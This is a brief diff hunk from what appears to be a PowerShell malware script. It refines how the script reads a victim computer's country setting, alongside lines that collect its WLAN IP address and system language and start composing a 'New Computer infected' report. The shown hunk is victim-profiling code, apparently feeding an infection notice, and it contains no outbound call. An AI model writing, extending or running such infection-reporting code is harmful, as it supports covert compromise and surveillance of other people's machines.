@@ -12,7 +12,7 @@ catch {
     $ipWlan = 'No Wlan' 
 } 
 $language = (Get-WinUserLanguageList)[0].autonym
-$country = Get-WinHomeLocation | Select-Object HomeLocation
+$country = (((Get-WinHomeLocation)[0] | Select-Object HomeLocation) | ConvertTo-Json)
 $description = 
 "
 New Computer infected 
